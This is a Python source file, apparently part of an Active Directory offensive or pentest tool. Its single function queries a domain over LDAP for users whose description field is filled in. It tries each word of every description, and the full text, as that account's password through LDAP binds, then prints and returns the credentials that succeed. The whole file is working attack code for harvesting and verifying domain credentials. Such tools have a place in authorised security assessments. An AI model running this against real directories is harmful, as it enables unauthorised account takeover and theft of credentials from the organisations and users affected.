from ldap3 import Connection, ALL
import re
from conn import *

def search_passwords(host,auth,domain,spray):
    # Connection with LDAP protocol
    conn,server = connection(host,auth,domain)

    # Separating the domain value as the search function requires that (example : cs.org becomes cs and org)
    dc1,dc2 = domain.split('.')

    # We get the two attributes mentioned (as well as the other information like the name etc)
    conn.search('dc='+dc1+',dc='+dc2, '(&(objectclass=user)(description=*))', attributes=['sAMAccountName','description'])

    users_success = []
    all_users = []

    if conn.entries:
        for entry in conn.entries:
            # We use a regex expression to get the user and the group from each entry (each account)
            pattern = r"CN=(?P<user>[^,]*),CN=(?P<group>[^,]*),DC=.*"
            match = re.search(pattern, str(entry), re.MULTILINE)

            if match:
                # Get the informations from the regex search and directly from the entry
                user = match.group('user')
                group = match.group('group')
                description = str(entry.description)
                sAMAccountName = str(entry.sAMAccountName)

                print(f"[*] User : {user}")
                print(f"[+] sAMAccountName : {sAMAccountName}")
                print(f"[+] Group : {group}")
                print(f"[+] Description : {description}")
                print(f"[+] Testing parts of the description to connect...")

                # Separating the description in parts, and adding them (as well as the entire description itself) to test for connectio
                parts_desc = description.split()
                parts_desc.append(description)

                success = False

                for part_pwd in parts_desc:
                    part_pwd = str(part_pwd)
                    try:
                        # Testing the connexion
                        conn = Connection(server, sAMAccountName+"@"+domain, part_pwd, auto_bind=True)
                    except Exception as e:
                        pass
                    else:
                        print("[+] Success : "+sAMAccountName+" with password "+part_pwd)
                        users_success.append(sAMAccountName+" "+part_pwd)
                        success = True
                if not success:
                    print("[+] Failed")
                all_users.append(sAMAccountName)
            else:
                print("[*] No match")
            print("\n")
    else:
        print("[*] No description found")

    return all_users,users_success,conn,server
